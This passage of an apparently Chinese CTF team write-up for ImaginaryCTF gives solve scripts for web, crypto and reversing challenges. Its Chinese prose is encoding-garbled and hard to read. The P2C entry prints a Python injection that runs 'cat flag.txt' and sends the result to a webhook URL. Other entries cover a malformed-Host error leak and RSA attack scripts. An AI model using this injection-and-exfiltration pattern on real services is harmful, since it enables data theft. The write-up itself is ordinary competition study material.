class="built_in">range</span>(num_threads):</span><br><span class="line">    thread = threading.Thread(target=send_request)</span><br><span class="line">    thread.start()</span><br><span class="line">    threads.append(thread)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> thread <span class="keyword">in</span> threads:</span><br><span class="line">    thread.join()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;All requests completed.&quot;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="P2C"><a href="#P2C" class="headerlink" title="P2C"></a>P2C</h3><ul>
<li>solver legend_yang<br>æŸ¥çœ‹åŸå§‹ç¢¼å¾Œï¼Œç™¼ç¾å¯ä»¥ç›´æ¥å¡py codeï¼Œå°±æ‹¿ä¹‹å‰å¯«çš„é€äº†<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib=<span class="built_in">__import__</span>(<span class="string">&#x27;urllib.request&#x27;</span>, fromlist=[<span class="string">&#x27;Request&#x27;</span>, <span class="string">&#x27;urlopen&#x27;</span>]);subprocess = <span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>);awab=subprocess.run([<span class="string">&#x27;cat&#x27;</span>, <span class="string">&#x27;flag.txt&#x27;</span>], capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>);url=<span class="string">&quot;&lt;webhook uri here&gt;&quot;</span>+awab.stdout;urllib.urlopen(url);<span class="keyword">return</span><span class="string">&quot;Hello, World!&quot;</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="Crystals"><a href="#Crystals" class="headerlink" title="Crystals"></a>Crystals</h3><ul>
<li>solver legend_yang<br>æŸ¥çœ‹åŸå§‹ç¢¼å¾Œç™¼ç¾flagå¥½åƒå’Œsinatraæ¡†æ¶æ¯”è¼ƒæœ‰é—œï¼Œåœ¨æœ¬åœ°é–‹äº†ä¸€å€‹æ²’æœ‰nginx proxyéçš„serverã€‚<br>äº‚å¡ä¸€å †å­—å…ƒå¾Œç™¼ç¾sinatraåœ¨400 bad requestsçš„æ™‚å€™æœƒè¿”å›hostnameå€¼ï¼Œè€Œé€™æ¬¡çš„flagå°±æ”¾åœ¨hostnameè£¡é¢</li>
</ul>
<p><code>http://crystals.chal.imaginaryctf.org/&#123;]&#125;;:&#39;&quot;,&lt;.&gt;/?~ğ˜ˆá¸†ğ–¢ğ•¯Ù¤á¸ÔĞÇğ™…Æ˜Ô¸â²˜ğ™‰à§¦Î¡ğ—¤ÉŒğ“¢ÈšĞ¦ğ’±Ñ ğ“§Æ³È¤Ñ§á–¯Ä‡ğ—±á»…ğ‘“ğ™œá‚¹ğ²ğ‘—ğ’ŒÄ¼á¹ƒÅ‰Ğ¾ğğ’’áµ²êœ±ğ™©á»«ğ—Åµğ’™ğ’šÅº1234567890!@#$%^&amp;*()-_=+[&#123;]&#125;;:&#39;&quot;,&lt;.&gt;/?~Ğá¸‚â²¤ğ——ğ–¤ğ—™ê ê“§ÈŠğ‰ğœ¥ê“¡ğ‘€ğ‘µÇ¬ğ™¿ğ‘„Å–ğ‘†ğ’¯ğ–´ğ˜ğ˜ê“«Å¸ğœ¡áº£ğ˜¢Æ€ğ–¼á¸‹áº¿áµ®â„Šğ™á¥ğ•›ĞºÎ¹á¹ƒÕ¤â±ºğ“…ğ˜²ğ•£ğ–˜Å§ğ‘¢á¹½áº‰ğ˜…áƒ§Å¾1234567890!@#$%^&amp;*()-_=+[&#123;]&#125;;:&#39;&quot;,&lt;.&gt;/?~Ñ¦ğ™±Æ‡á—Î£â„±ÔÒ¤Ù¡ğ”Ğšğ“›ğ“œÆÈğš¸ğ‘„á¹šğ“¢á¹®á¹ºÆ²á”ê“«ğšˆğš­ğœ¶áÃ§áƒ«ğ‘’ğ–¿ğ—€á¸§ğ—‚ğ£ÒÉ­á¸¿ğ•Ÿğ¨ğ”ğ•¢á¹›ğ“¼Ñ‚Ãºğ”³áºƒâ¤¬ğ²ğ—“1234567890!@#$%^&amp;*()-_=+[&#123;]&#125;;:&#39;&quot;,&lt;.&gt;/?~ğ– Î’ğ’ğ˜‹ğ™´å°ç†Šğ“•Ä¢Èá»ˆğ•µê“—ÊŸğ™¼â„•à§¦ğš¸ğ—¤Õ€ê“¢á¹°Ç“â…¤ğ”šâ²¬ğ‘Œğ™•ğ˜¢ğ•¤</code></p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h3><ul>
<li>solver yucheng2663</li>
</ul>
<p><strong>main.py</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">q = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">flag = <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">flag_int = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">secret_key = []</span><br><span class="line"><span class="keyword">while</span> flag_int:</span><br><span class="line">    secret_key.append(flag_int % q)</span><br><span class="line">    flag_int //= q</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;secret_key = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>é€™é¡Œç›´æ¥ä¸Ÿçµ¦GPTè§£é‡‹æµç¨‹ï¼Œä»–æœƒè¬›ä¸€å¤§å †æ±è¥¿çµ¦ä½ ï¼Œä½†å…¶å¯¦é‡é»å°±æ˜¯æœ€å¾Œé¢æœ‰æåˆ°<em><strong>ç”¢ç”Ÿçš„ secret_key æ¸…å–®å¯ä»¥ç”¨ä¾†é‚„åŸåŸå§‹æ•¸æ“š</strong></em><br>æ‰€ä»¥åŸºæœ¬ä¸Šå¯ä»¥ç›´æ¥æŠŠé¡Œç›®çš„out.txtä¸Ÿçµ¦GPTå»å¹«ä½ å¯«å‡ºåæ¨å¯†æ–‡çš„ç¨‹å¼ç¢¼</p>
<p><strong>exp.py</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># å‡è®¾ secret_key å’Œ q å·²ç»å®šä¹‰</span></span><br><span class="line">secret_key = [<span class="number">10</span>, <span class="number">52</span>, <span class="number">23</span>, <span class="number">14</span>, <span class="number">52</span>, <span class="number">16</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">37</span>, <span class="number">37</span>, <span class="number">3</span>, <span class="number">25</span>, <span class="number">50</span>, <span class="number">32</span>, <span class="number">19</span>, <span class="number">14</span>, <span class="number">48</span>, <span class="number">32</span>, <span class="number">35</span>, <span class="number">13</span>, <span class="number">54</span>, <span class="number">12</span>, <span class="number">35</span>, <span class="number">12</span>, <span class="number">31</span>, <span class="number">29</span>, <span class="number">7</span>, <span class="number">29</span>, <span class="number">38</span>, <span class="number">61</span>, <span class="number">37</span>, <span class="number">27</span>, <span class="number">47</span>, <span class="number">5</span>, <span class="number">51</span>, <span class="number">28</span>, <span class="number">50</span>, <span class="number">13</span>, <span class="number">35</span>, <span class="number">29</span>, <span class="number">46</span>, <span class="number">1</span>, <span class="number">51</span>, <span class="number">24</span>, <span class="number">31</span>, <span class="number">21</span>, <span class="number">54</span>, <span class="number">28</span>, <span class="number">52</span>, <span class="number">8</span>, <span class="number">54</span>, <span class="number">30</span>, <span class="number">38</span>, <span class="number">17</span>, <span class="number">55</span>, <span class="number">24</span>, <span class="number">41</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">q = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–åæ¨çš„é•¿æ•´æ•°</span></span><br><span class="line">reconstructed_int = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># éå† secret_key åˆ—è¡¨å¹¶æŒ‰åŸºæ•° q é‡æ–°ç»„åˆæˆä¸€ä¸ªé•¿æ•´æ•°</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(secret_key)-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    reconstructed_int = reconstructed_int * q + secret_key[i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†é•¿æ•´æ•°è½¬æ¢å›å­—èŠ‚åºåˆ—</span></span><br><span class="line">original_flag = long_to_bytes(reconstructed_int)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;original_flag = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>


<h3 id="integrity"><a href="#integrity" class="headerlink" title="integrity"></a>integrity</h3><ul>
<li>solver Whale120<br><strong>chal.py</strong>  <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> crc_hqx</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">tot = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, tot)</span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read())</span><br><span class="line">ct = <span class="built_in">pow</span>(flag, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#signature = pow(flag, d, n) # no, im not gonna do that</span></span><br><span class="line">signature = <span class="built_in">pow</span>(flag, crc_hqx(long_to_bytes(d), <span class="number">42</span>), n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;signature = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></li>
</ul>
<p>å…¶ä¸­ï¼Œcrc_hqxæœƒå›å‚³ä¸€å€‹ 16 bitsçš„ç°½åï¼Œæ‰€ä»¥æ•´é¡Œå°±æœƒè®Šæˆä¸€å€‹<a target="_blank" rel="noopener" href="https://infosecwriteups.com/rsa-attacks-common-modulus-7bdb34f331a5">å…±æ¨¡æ”»æ“Š(link)</a>çš„é¡Œç›®ã€‚  </p>
<p><strong>exp.py</strong></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line">n = <span class="number">10564138776494961592014999649037456550575382342808603854749436027195501416732462075688995673939606183123561300630136824493064895936898026009104455605012656112227514866064565891419378050994219942479391748895230609700734689313646635542548646360048189895973084184133523557171393285803689091414097848899969143402526024074373298517865298596472709363144493360685098579242747286374667924925824418993057439374115204031395552316508548814416927671149296240291698782267318342722947218349127747750102113632548814928601458613079803549610741586798881477552743114563683288557678332273321812700473448697037721641398720563971130513427</span></span><br><span class="line">ct = <span class="number">5685838967285159794461558605064371935808577614537313517284872621759307511347345423871842021807700909863051421914284950799996213898176050217224786145143140975344971261417973880450295037249939267766501584938352751867637557804915469126317036843468486184370942095487311164578774645833237405496719950503828620690989386907444502047313980230616203027489995981547158652987398852111476068995568458186611338656551345081778531948372680570310816660042320141526741353831184185543912246698661338162113076490444675190068440073174561918199812094602565237320537343578057719268260605714741395310334777911253328561527664394607785811735</span></span><br><span class="line">signature = <span class="number">1275844821761484983821340844185575393419792337993640612766980471786977428905226540853335720384123385452029977656072418163973282187758615881752669563780394774633730989087558776171213164303749873793794423254467399925071664163215290516803252776553092090878851242467651143197066297392861056333834850421091466941338571527809879833005764896187139966615733057849199417410243212949781433565368562991243818187206912462908282367755241374542822443478131348101833178421826523712810049110209083887706516764828471192354631913614281317137232427617291828563280573927573115346417103439835614082100305586578385614623425362545483289428</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">common_module_attack</span>(<span class="params">x1, x2</span>):</span><br><span class="line">    pad=inverse(x1, x2)</span><br><span class="line">    <span class="keyword">assert</span> x1*pad % x2 ==<span class="number">1</span></span><br><span class="line">    val=(<span class="built_in">pow</span>(ct, pad, n)*<span class="built_in">pow</span>(signature, -(x1*pad//x2), n))%n</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(val)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">2</span>, <span class="number">65536</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;ictf&#x27;</span> <span class="keyword">in</span> common_module_attack(e, i):</span><br><span class="line">        <span class="built_in">print</span>(common_module_attack(e, i))</span><br></pre></td></tr></table></figure>

<h2 id="REVERSING"><a href="#REVERSING" class="headerlink" title="REVERSING"></a>REVERSING</h2><h3 id="unoriginal"><a href="#unoriginal" class="headerlink" title="unoriginal"></a>unoriginal</h3><ul>
<li>solver Whale120<br>xor, keyæ˜¯5<br><img src="https://hackmd.io/_uploads/S120woqdR.png" alt="image"></li>
</ul>
<h3 id="RUST"><a href="#RUST" class="headerlink" title="RUST"></a>RUST</h3><ul>
<li>solver Whale120<br>ä¸€å€‹åŠ å¯†ç¨‹å¼ï¼Œè¦é‚„åŸå¯†é‘°è·Ÿæ‰¾åˆ°èˆ‡å¯†æ–‡å°æ‡‰ã„‰æ˜æ–‡<br>(å…¶å¯¦æˆ‘æ²’æœ‰çœŸçš„åšå¾ˆæ·±å…¥çš„é€†å‘)ï¼Œä¸»è¦è§€å¯Ÿå…©é»ï¼š<br>1.æ˜¯é€å­—åŠ å¯†<br>2.keyçš„å¤§å°è·Ÿè¼¸å‡ºçš„å¤§äº›æˆé«˜åº¦æ­£ç›¸é—œ<br>æœ€å¾Œå°±æ‰‹å‹•äºŒåˆ†æœæ¹Šå‡ºkey â€¦(ä»¥flagç¬¬ä¸€å€‹å­—å…ƒiç‚ºæ¨£æœ¬)</li>
</ul>
<p><img src="https://hackmd.io/_uploads/H1JoFjq_A.png" alt="image">  </p>
<p><img src="https://hackmd.io/_uploads/BkO2toquR.png" alt="image">  </p>
<p><img src="https://hackmd.io/_uploads/B1KpKi5OA.png" alt="image">  </p>
<h3 id="bf"><a href="#bf" class="headerlink" title="bf"></a>bf</h3><ul>
<li>solver hokak<br>é¡Œç›®çµ¦ä½ ä¸€æ®µbrainfuckçš„code<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">,&gt;&gt;+++++++++++[&lt;+++&gt;-]&lt;[-&lt;+&gt;]&lt;------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++++++[&lt;+++++++&gt;-]&lt;[-&lt;+&gt;]&lt;-------------------------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++[&lt;++++&gt;-]&lt;[-&lt;+&gt;]&lt;----------------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++++++[&lt;+++++++&gt;-]&lt;[-&lt;+&gt;]&lt;----------------------------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++++++++[&lt;+++&gt;-]&lt;[-&lt;+&gt;]&lt;------------------------------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++++[&lt;++++++++&gt;-]&lt;[-&lt;+&gt;]&lt;-----------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++++[&lt;+++++&gt;-]&lt;[-&lt;+&gt;]&lt;----------------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++[&lt;++++&gt;-]&lt;[-&lt;+&gt;]&lt;----------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++[&lt;+++++&gt;-]&lt;[-&lt;+&gt;]&lt;----------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++[&lt;+++++&gt;-]&lt;[-&lt;+&gt;]&lt;---------------------------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++[&lt;+++++++&gt;-]&lt;[-&lt;+&gt;]&lt;------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++[&lt;+++&gt;-]&lt;[-&lt;+&gt;]&lt;--------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++++++++[&lt;+++&gt;-]&lt;[-&lt;+&gt;]&lt;------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++[&lt;+++++&gt;-]&lt;[-&lt;+&gt;]&lt;--------------------------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++++[&lt;+++++++&gt;-]&lt;[-&lt;+&gt;]&lt;--------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++[&lt;+++++&gt;-]&lt;[-&lt;+&gt;]&lt;------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++++[&lt;+++++++&gt;-]&lt;[-&lt;+&gt;]&lt;------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++[&lt;+++++++&gt;-]&lt;[-&lt;+&gt;]&lt;-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++[&lt;+++++&gt;-]&lt;[-&lt;+&gt;]&lt;-------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++[&lt;+++++&gt;-]&lt;[-&lt;+&gt;]&lt;--------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++++++[&lt;+++++&gt;-]&lt;[-&lt;+&gt;]&lt;-------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++++++[&lt;+++++++&gt;-]&lt;[-&lt;+&gt;]&lt;-----------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++++++[&lt;+++++++&gt;-]&lt;[-&lt;+&gt;]&lt;--------------------------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++++++[&lt;++++++&gt;-]&lt;[-&lt;+&gt;]&lt;----------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++++++++[&lt;+++&gt;-]&lt;[-&lt;+&gt;]&lt;---------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++[&lt;++++&gt;-]&lt;[-&lt;+&gt;]&lt;-----------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++++++++++++++[&lt;++&gt;-]&lt;[-&lt;+&gt;]&lt;-----------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++++++++++++++[&lt;+++&gt;-]&lt;[-&lt;+&gt;]&lt;----------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;+++++++++++++++++++[&lt;+++&gt;-]&lt;[-&lt;+&gt;]&lt;-----------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;],&gt;&gt;++++++[&lt;+++++&gt;-]&lt;[-&lt;+&gt;]&lt;-----------------------------------------------------------------------------------------------------------------------------------------------------------[&gt;&lt;]</span><br></pre></td></tr></table></figure>
ç„¶å¾Œç¨å¾®å­¸ä¸€ä¸‹brainfuckï¼Œç™¼ç¾ä»–å¯ä»¥ç”¨<a target="_blank" rel="noopener" href="https://github.com/paulkaefer/bftoc">å·¥å…·</a>è½‰æˆCèªè¨€</li>
</ul>
<p>ç„¶å¾Œæˆ‘çœ‹åˆ°é€™å †æ±è¥¿ï¼Œçœ‹èµ·ä¾†å°±è¶…å®¹æ˜“é€²å…¥ç„¡çª®è¿´åœˆ<br><img src="https://hackmd.io/_uploads/HJHoIM0dA.png" alt="image"></p>
<p>ä½†ä»”ç´°è§€å¯Ÿå¾Œï¼Œæœƒå¾—çŸ¥æ¯æ®µè¿´åœˆéƒ½é•·å¾—å·®ä¸å¤š<br>å¯ä»¥æŠŠ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">    tape[ptr] += <span class="number">3</span>;</span><br><span class="line">    ptr += <span class="number">1</span>;</span><br><span class="line">    tape[ptr] -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>æ›æˆ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tape[ptr - <span class="number">1</span>] += tape[ptr] * <span class="number">3</span>, tape[ptr] = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>ä»¥æ­¤é¡æ¨å…¶ä»–æ•¸å­—</p>
<p>é‚„æœ‰</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    ptr += <span class="number">1</span>;</span><br><span class="line">    ptr -= <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>çš„åŠŸèƒ½æ˜¯å¦‚æœä¸ç‚º0å°±æœƒé€²å…¥ç„¡çª®è¿´åœˆ<br>é‚£å¦‚æœæŠŠé€™æ®µæ”¹æˆç›´æ¥å¼·åˆ¶é€€å‡ºç¨‹å¼å°±è¼•é¬†å¤šäº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tape[ptr] != <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>æ”¹å®Œçš„code</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span 